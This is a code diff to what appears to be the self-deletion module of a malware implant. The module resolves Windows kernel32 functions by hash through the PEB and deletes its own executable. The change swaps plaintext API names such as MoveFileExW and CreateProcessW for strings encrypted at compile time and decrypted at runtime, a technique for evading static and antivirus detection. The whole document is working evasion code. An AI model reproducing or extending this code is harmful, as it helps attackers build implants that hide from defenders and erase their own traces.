@@ -12,6 +12,7 @@
 #include "self_delete.h"
 #include "config.h"
 #include "engine.h"
+#include "enc_strings.h"
 
 #ifdef ENABLE_SELF_DELETE
 #include "peb.h"
@@ -41,8 +42,8 @@ typedef DWORD (*FnGetTempPathW)(DWORD, PWSTR);
 
 static void *load_kernel32(void)
 {
-    return mirage_get_module_by_hash(
-        mirage_encrypted_hash_module("kernel32.dll"));
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    return mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
 }
 
 /* ── Helper: ASCII to wide ──────────────────────────────────── */
@@ -65,8 +66,9 @@ char *self_delete_get_exe_path(void)
     void *k32 = load_kernel32();
     if (!k32) return NULL;
 
+    char fn[32]; enc_decrypt(enc_GetModuleFileNameW, ENC_GETMODULEFILENAMEW_LEN, fn);
     FnGetModuleFileNameW pGetModuleFileNameW = (FnGetModuleFileNameW)mirage_get_function_by_hash(
-        k32, mirage_encrypted_hash_func("GetModuleFileNameW"));
+        k32, mirage_encrypted_hash_func(fn));
     if (!pGetModuleFileNameW) return NULL;
 
     wchar_t buf[4096];
@@ -154,8 +156,9 @@ static int delete_level2(const char *path)
     void *k32 = load_kernel32();
     if (!k32) return 0;
 
+    char fn[32]; enc_decrypt(enc_MoveFileExW, ENC_MOVEFILEEXW_LEN, fn);
     FnMoveFileExW pMoveFileExW = (FnMoveFileExW)mirage_get_function_by_hash(
-        k32, mirage_encrypted_hash_func("MoveFileExW"));
+        k32, mirage_encrypted_hash_func(fn));
     if (!pMoveFileExW) return 0;
 
     wchar_t path_w[1024];
@@ -184,12 +187,16 @@ static int delete_level3(const char *path)
     void *k32 = load_kernel32();
     if (!k32) return 0;
 
+    char fn[32];
+    enc_decrypt(enc_GetTempPathW, ENC_GETTEMPPATHW_LEN, fn);
     FnGetTempPathW pGetTempPathW = (FnGetTempPathW)mirage_get_function_by_hash(
-        k32, mirage_encrypted_hash_func("GetTempPathW"));
+        k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetCurrentProcessId, ENC_GETCURRENTPROCESSID_LEN, fn);
     FnGetCurrentProcessId pGetCurrentProcessId = (FnGetCurrentProcessId)mirage_get_function_by_hash(
-        k32, mirage_encrypted_hash_func("GetCurrentProcessId"));
+        k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_CreateProcessW, ENC_CREATEPROCESSW_LEN, fn);
     FnCreateProcessW pCreateProcessW = (FnCreateProcessW)mirage_get_function_by_hash(
-        k32, mirage_encrypted_hash_func("CreateProcessW"));
+        k32, mirage_encrypted_hash_func(fn));
     if (!pGetTempPathW || !pGetCurrentProcessId || !pCreateProcessW) return 0;
 
     wchar_t temp_buf[512];
